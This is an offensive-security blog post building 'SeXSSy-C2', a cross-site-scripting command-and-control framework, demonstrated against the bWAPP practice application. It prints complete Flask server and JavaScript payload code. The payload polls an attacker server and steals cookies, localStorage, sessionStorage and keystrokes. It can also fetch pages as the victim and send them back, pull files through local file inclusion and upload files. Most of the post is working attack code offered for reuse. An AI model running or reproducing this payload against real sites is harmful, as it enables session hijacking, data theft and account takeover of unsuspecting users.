---
layout: post
title:  "Offensive XSS 4: See with their eyes"
date:   2022-04-30 18:05:55 +0300
image:  OffensiveXSS4/title.jpg
author-name: strik1r
tags:   [XSS, data extraction]
---

<h2>Prologue:</h2>
We are starting the advanced XSS blog posts. We will be a little faster from here on and skip describing trivial things, however the full code will be available at the end of this post and also on our GitHub repository. As usual, let's continue adding features and capabilities picking it up from our previous posts. This time we will be adding a feature that would download let our victim browse a page and fetch it back to us. This particular capability let's us understand what's the data available if a victim browses the target page.
<br>
<h2>The command</h2>
Initially we will be doing that by setting a parameter in the GET request. This payload would contain a "setSiteCommand" parameter which would contain the site we want to redirect our user to! This site will be downloaded and be sent back to us as a response.

<h2>Setting the command</h2>
```
@app.route("/setSiteCommand", methods=['GET'])
def setSiteCommand():
    global command
    global isNewFileDownloaded
    global downloadedSite
    command = ""
    requestArgs = request.args
    siteValue = ""

    for index,i in enumerate(requestArgs.keys()):
        if index == 0:
            siteValue = requestArgs[i]
        else:
            siteValue = siteValue + "&" + i + "=" + requestArgs[i]
    command = "command=getSite&site=" + encodeBase64(siteValue)
    while not isNewFileDownloaded:
        time.sleep(1)
    isNewFileDownloaded = False

    downloadedSite = downloadedSite.replace('<a href="','<a href="http://127.0.0.1:5000/setSiteCommand?site=http://bee/bWAPP/')
    return downloadedSite
```

Now let's understand new setSiteCommand function's code above. We call this on the server to set target site which we wanted to download. To get the result in the browser window, we need a global flag called *isNewFileDownloaded*. This will be set when the response from the xss arrives and it is ready to be shown. In the global variable downloadedSite we will have the response from the XSS payload executed. Then we parse the GET request parameters and encode the URL to base64. As we have only one parameter at this time, the site itself, we should implement a check to see whether this is the first run. This time the parameter will be "site" so that we do not need to base64 encode. At the end we check if the new file is downloaded, if not we wait for 2 seconds, then when we finally get the site we injected. Before returning it as a response, we will do a little replacement. We will replace all the anchor tags
<a href=" and add our own server. For example a link to href="xss_stored_1.php" will be replaced to href="http://127.0.0.1:5000/setSiteCommand?site=http://bee/bWAPP/xss_stored_1.php"/>. Clicking on it will let our server know to fetch the contents of the site "http://bee/bWAPP/xss_stored_1.php" making our life and navigation to the page a bit easier. This obviously needs to be replaced for every target.

<h2>Save the site</h2>

```
@app.route("/saveSite", methods=['POST'])
def saveSite():
    global isNewFileDownloaded
    global downloadedSite

    siteBase64 = request.form["site"]
    downloadedSite = decodeBase64(siteBase64)
    isNewFileDownloaded = True
    return ""

```
<br>
We also need a simple endpoint that will handle the saving of the site. Remember that the setSiteCommand function will wait until this function sets the global isNewFileDownloaded parameter. Here the only thing that happens is that we grab the site content base64 encoded and after decoding it we will store it in downloadedSite.
<br>
```
def encodeBase64(message):
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message

def decodeBase64(message):
    base64_bytes = message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    result = message_bytes.decode('ascii')
    return result
```
<br>
We also have some basic base64 encoding6decoding functions we used in the code. 

<h2>The payload</h2>
To make the payload work, we need to set a new command. We need to set the usual parameters in the function executeCommand and some variables at the beginning the full code is at the end of the post. The most important part is the newly added function to handle getting the site.
<br>
```
async function getSite() {
    site = atob(site)
    const response = await fetch(site,{
        method: "GET"
    })
    let text = await response.text()

    downloadedSiteBase64URLEncoded = encodeURIComponent(btoa(text))
    postdata = "site=" + downloadedSiteBase64URLEncoded + "&" + "name=test.js"
    xhr = new XMLHttpRequest();
    xhr.open('POST', saveSiteUrl);
    xhr.withCredentials = "true";
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(postdata);
}
```
<br>
First we need to convert the url we got from base64 back to string. We can do this with the built- in atob function. Then we will call the site with a GET request and grab the response text. First we encode it to base64 with the btoa built in function then we should make sure that everything is correctly encoded so we use the encodeURIComponent as in the previous examples. Other than these we need to set different basic parameters as for all the other commands.

<h2>In action </h2>
First, let's test our target by grabbing a robots.txt as set in the "site" parameter. We just enter the parameterized url in the browser and create an XSS payload as shown below:                                                                          
```
http://127.0.0.1:5000/setSiteCommand?site=http://bee/bWAPP/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250
```
<br>
After a few seconds we will be seeing the result:
<br>
<br>
![](/img/OffensiveXSS4/savesite1.PNG)
<br>
<br>
Then to further test it we can click on some of the links for example "Change Password" button:
<br>
<br>
![](/img/OffensiveXSS4/changepassword.PNG)


<h2>Prologue:</h2>
With this added function we've a functioning XSS payload that can download the a site as a victim and send it back to us. We also have the full source code to do it and a working demo. We will end this post with this specific feature. Every update will have a feature like this and make our SeXSSy-C2 a full-fledged framework to control a victim's browser.

<h2>Source Code:</h2>
Server:
```
from flask import Flask
from flask import request
from flask_cors import CORS
import base64
import os
import time

app = Flask(__name__)
cors = CORS(app, resources={r"/*": {"origins": "*"}})

command = ""
isNewFileDownloaded = False
downloadedSite = ""

def encodeBase64(message):
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message

def decodeBase64(message):
    base64_bytes = message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    result = message_bytes.decode('ascii')
    return result

@app.route("/saveCookie", methods=['POST', 'GET'])
def saveCookie():
    cookie = ""
    if request.method == 'GET':
        cookie = request.args.get("a")
    else:
        cookie = request.form["a"]
    f = open("savedCookies.txt", "a")
    f.write(cookie)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveLocalStorage", methods=['POST', 'GET'])
def saveLocalStorage():
    localStorage = ""
    if request.method == 'GET':
        localStorage = request.args.get("a")
    else:
        localStorage = request.form["a"]
    f = open("savedLocalStorage.txt", "a")
    f.write(localStorage)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveSessionStorage", methods=['POST', 'GET'])
def saveSessionStorage():
    sessionStorage = ""
    if request.method == 'GET':
        sessionStorage = request.args.get("a")
    else:
        sessionStorage = request.form["a"]
    f = open("savedSessionStorage.txt", "a")
    f.write(sessionStorage)
    f.write("\n")
    f.close()
    return ""

@app.route("/saveFile", methods=['POST'])
def saveFile():
    separator = "/"
    mainFolder = "./LFIFiles"
    fileContent = request.form["fileContent"]
    fileName = request.form["fileName"]
    fileName = fileName.replace("../","")
    
    if fileName.startswith("/"):
        separator = ""
    fullPathFileName = mainFolder + separator + fileName
    filePath = '/'.join(fileName.split('/')[0:-1])
    storageFolder = mainFolder + separator + filePath

    if not os.path.exists(storageFolder):
        os.makedirs(storageFolder)
    f = open(fullPathFileName, "a")
    f.write(fileContent)
    f.write("\n")
    f.close()
    return ""

@app.route("/keys", methods=['POST'])
def keys():
    keys = request.form["keys"]
    f = open("savedkeys.txt", "a")
    f.write(keys)
    f.write("\n")
    f.close()
    return ""


@app.route("/getCommand", methods=['POST'])
def getCommand():
    global command
    result = command
    command = ""
    return result

@app.route("/setCommand", methods=['POST'])
def setCommand():
    global command
    command = request.get_data()
    return command

@app.route("/saveSite", methods=['POST'])
def saveSite():
    global isNewFileDownloaded
    global downloadedSite

    siteBase64 = request.form["site"]
    downloadedSite = decodeBase64(siteBase64)
    isNewFileDownloaded = True
    return ""

@app.route("/setSiteCommand", methods=['GET'])
def setSiteCommand():
    global command
    global isNewFileDownloaded
    global downloadedSite
    command = ""
    requestArgs = request.args
    siteValue = ""

    for index,i in enumerate(requestArgs.keys()):
        if index == 0:
            siteValue = requestArgs[i]
        else:
            siteValue = siteValue + "&" + i + "=" + requestArgs[i]
    command = "command=getSite&site=" + encodeBase64(siteValue)
    while not isNewFileDownloaded:
        time.sleep(1)
    isNewFileDownloaded = False

    downloadedSite = downloadedSite.replace('<a href="','<a href="http://127.0.0.1:5000/setSiteCommand?site=http://bee/bWAPP/')
    return downloadedSite
```

XSS:

```
serverURL = "http://127.0.0.1:5000"
commandUrl = serverURL + "/getCommand"
saveSiteUrl = serverURL + "/saveSite"
var command = "" 
var lfiFile = ""
var exit = false
var value = ""
var key = ""
var base64File = ""
var uploadFileName = ""
var contentType = ""
var site = ""

const COMMAND = "command"
const LFIFILE = "lfiFile"
const VALUE = "value"
const KEY = "key"
const BASE64FILE = "base64File"
const UPLOADFILENAME = "uploadFileName"
const CONTENTYPE = "contentType"
const SITE = "site"

function parseCommand (element) {
    element = element.split("=");
    if (element[0] == COMMAND) {
        command = element[1];
    }
    if (element[0] == LFIFILE) {
        lfiFile = element[1];
    }
    if (element[0] == VALUE) {
        value = element[1];
    }
    if (element[0] == KEY) {
        key = element[1];
    }
    if (element[0] == BASE64FILE) {
        base64File = element[1];
    }
    if (element[0] == UPLOADFILENAME) {
        uploadFileName = element[1];
    }
    if (element[0] == CONTENTYPE) {
        contentType = element[1];
    }
    if (element[0] == SITE) {
        site = element[1];
    }
}

function resetCommand(){
    command = "";
    lfiFile = "";
    value = "";
    key = "";
    base64File = "";
    uploadFileName = "";
    contentType = "";
    site = "";
}

async function getCommand() {
    let response = await fetch(commandUrl,{
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
    let text = await response.text()
    splittedBody = text.split("&");
    splittedBody.forEach(function(element){
        parseCommand(element)
    });
}

async function runLFI() {
    var urlOfThePage = window.location.protocol + "//" + window.location.host
    lfiTarget = urlOfThePage + "/bWAPP/rlfi.php?language="+lfiFile+"&action=go";
    dataSaveUrl = serverURL + "/saveFile"
    let response = await fetch(lfiTarget);
    let data = await response.text();
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(data, 'text/html');
    
    var text = htmlDoc.getElementById("main").innerText;
    fileContent = text.substring(text.indexOf('Go') + 2);
    console.log(lfiFile)
    await fetch(dataSaveUrl,{
        body: "fileContent=" + encodeURIComponent(fileContent) + "&fileName=" + encodeURIComponent(lfiFile), 
        headers: 
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
}

function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

function fileUpload() {

    var b64file = base64File
    var blob = base64toBlob(b64file, contentType);
    
    var formData = new FormData();
    formData.append('file', blob, uploadFileName);
    formData.append('MAX_FILE_SIZE', 10);
    formData.append('form','Upload');
    
    var urlOfThePage = window.location.protocol + "//" + window.location.host
    var url = urlOfThePage + '/bWAPP/unrestricted_file_upload.php';
    xhr = new XMLHttpRequest();
    xhr.open('POST', url);
    xhr.withCredentials = "true";
    
    xhr.send(formData);
}

function getCookie() {
    var url = serverURL + "/saveCookie";
    var body = "a=" + document.cookie;
    xr = new XMLHttpRequest();
    xr.open("POST", url, true);
    xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    xr.send(body);
}

function setCookie() {
    document.cookie = key + "=" + value; 
}

function getLocalStorage() { 
    var data = window.localStorage.getItem(key);
    var i=new Image;
    i.src= serverURL + "/saveLocalStorage?a=" +data;
}

function setLocalStorage() { 
    localStorage.setItem(key, value)
}

function getSessionStorage() { 
    var data = window.sessionStorage.getItem(key);
    var i=new Image;
    i.src= serverURL + "/saveSessionStorage?a=" + data;
}

function setSessionStorage() { 
    sessionStorage.setItem(key, value)
}

async function getSite() {
    site = atob(site)
    const response = await fetch(site,{
        method: "GET"
    })
    let text = await response.text()

    downloadedSiteBase64URLEncoded = encodeURIComponent(btoa(text))
    postdata = "site=" + downloadedSiteBase64URLEncoded + "&" + "name=test.js"
    xhr = new XMLHttpRequest();
    xhr.open('POST', saveSiteUrl);
    xhr.withCredentials = "true";
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(postdata);
}

async function executeCommand() {
    if (command == "lfi") {
        await runLFI()
    }

    if (command == "fileUpload") {
        fileUpload()
    }

    if (command == "getCookie") {
        getCookie()
    }

    if (command == "setCookie") {
        setCookie()
    }
    
    if (command == "getLocalStorage") {
        getLocalStorage()
    }

    if (command == "setLocalStorage") {
        setLocalStorage()
    }

    if (command == "getSessionStorage") {
        getSessionStorage()
    }

    if (command == "setSessionStorage") {
        setSessionStorage()
    }

    if (command == "getSite") {
        await getSite()
    }

    resetCommand()
}

setInterval(function(){ 
    getCommand();
    executeCommand();
}, 5000);
```
